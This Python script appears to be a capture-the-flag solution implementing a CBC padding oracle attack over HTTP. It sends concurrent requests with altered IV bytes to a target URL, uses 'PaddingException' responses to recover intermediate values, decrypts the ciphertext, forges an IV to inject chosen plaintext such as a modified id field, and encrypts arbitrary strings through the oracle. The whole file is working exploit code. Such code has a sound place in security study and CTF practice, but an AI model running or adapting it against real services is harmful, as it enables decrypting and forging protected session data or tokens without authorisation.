import base64
import asyncio
import aiohttp

def b64e(x):
    return base64.b64encode(x).decode("utf-8").replace('=', '~').replace('/', '!').replace('+', '-')
def b64d(x):
    return base64.b64decode(x.replace('~', '=').replace('!', '/').replace('-', '+'), validate=True)

def data_xor(data_bytes1, data_bytes2):
    xor = bytearray(b'\x00' * len(data_bytes1))
    for i in range(len(data_bytes1)):
        xor[i] = data_bytes1[i] ^ data_bytes2[i]
    return xor

def print_data_hex_xor(data_bytes1, data_bytes2):
    print_data_hex(data_xor(data_bytes1, data_bytes2))       

def print_data_hex(data_bytes):
    hexres = data_bytes.hex()
    i = 1
    while i < len(hexres):
        print(hexres[i-1:i+1], end =" ")
        if (i+1)%32 == 0:
            print()
        i=i+2

async def request_ct(url, ct):
    uri = f'{url}{str(ct)}'
    async with aiohttp.ClientSession() as session:
        async with session.get(uri) as response:
            result = await response.text()
            return result.splitlines()

async def attack_block(url, ivblock, datablock):
    
    intermediates = bytearray(b'\x00'*len(datablock))
    new_ivblock = bytearray(ivblock)
    
    for block_index in range(len(ivblock)):
        padding_size = block_index+1
        async_list = []
        found = False
        max_tasks = 16
        for task_block in range(0, int(256/max_tasks)):
            if found == True:
                break
            for j in range(task_block * max_tasks, (task_block+1) * max_tasks):
                new_ivblock[-block_index-1] = j
                action_item = asyncio.create_task(request_ct(url, b64e(new_ivblock + datablock)))
                async_list.insert(j, action_item)
            for j in range(task_block * max_tasks, (task_block+1) * max_tasks):
                new_ivblock[-block_index-1] = j
                request_result = await async_list[j]
                if request_result[-1] != "PaddingException":
                    print(str(block_index) + " " + hex(j) + " " + request_result[-1])
                    print(b64e(new_ivblock))
                    # intermediate = ciphertext ^ padding_size
                    intermediates[-block_index-1] = new_ivblock[-block_index-1] ^ padding_size
                    # if it is not the original value: stop searching
                    if new_ivblock[-block_index-1] != ivblock[-block_index-1]:
                        found = True
                        break
        for k in range(padding_size):
            # next_cyphertext = intermediate ^ padding_size+1
            new_ivblock[-k-1] = intermediates[-k-1] ^ padding_size+1
        print_data_hex_xor(new_ivblock, intermediates)
    
    return intermediates

async def attack(url, data, blocksize):
    blocksize=16
    intermediates = []
    for blocknumber in range(int(len(data)/blocksize)-1):
        start_index=blocksize*blocknumber
        datablock = data[start_index+blocksize:start_index+blocksize+blocksize]
        ivblock = data[start_index:start_index+blocksize]
        intermediate = await attack_block(url, ivblock, datablock)
        intermediates.append(intermediate)

    cleartext = data_xor(data[:len(data) - blocksize], intermediates[blocksize:])
    print(print_data_hex(cleartext))
    print()
    print(data_xor(intermediates[blocksize:blocksize*2], cleartext[:blocksize]))
    print()
    new_cleartext = bytearray(bytes('{"id": "1;c"}   ', 'utf-8'))
    # new_cleartext = bytearray(bytes('{"flag": "^FL"} ', 'utf-8'))
    new_iv = bytearray(data[:blocksize])
    new_iv = data_xor(intermediates[blocksize:(blocksize*2)], new_cleartext)
    new_iv[15] = intermediates[blocksize+15] ^ 1
    print_data_hex(new_iv)
    print(new_iv)
    print(b64e(new_iv + data[blocksize:]))
    print()
    print(data_xor(new_iv, intermediates[blocksize:blocksize*2]).decode('utf8'))
    print(cleartext.decode('utf8'))
    print()

async def cipher_string(url, string, blocksize):
    
    empty_block = bytearray(b'\x00'*blocksize)
    string_bytes = bytearray(bytes(string, 'utf-8'))
    if len(string_bytes)%blocksize ==  0:
        string = string + " "
        string_bytes = bytearray(bytes(string, 'utf-8'))
    padding = blocksize-(len(string_bytes)%blocksize)
    string_bytes = string_bytes + (bytes([padding])*padding)

    block_count=int(len(string_bytes)/blocksize)
    cipher_data=empty_block
    cipherblock=empty_block
    for i in range(block_count):
        cleartextblock = string_bytes[(block_count-i-1)*blocksize:(block_count-i)*blocksize]
        intermediate = await attack_block(url, empty_block, cipherblock)
        cipherblock = data_xor(cleartextblock, intermediate)
        cipher_data = cipherblock + cipher_data

    print(b64e(cipher_data))
    return b64e(cipher_data)

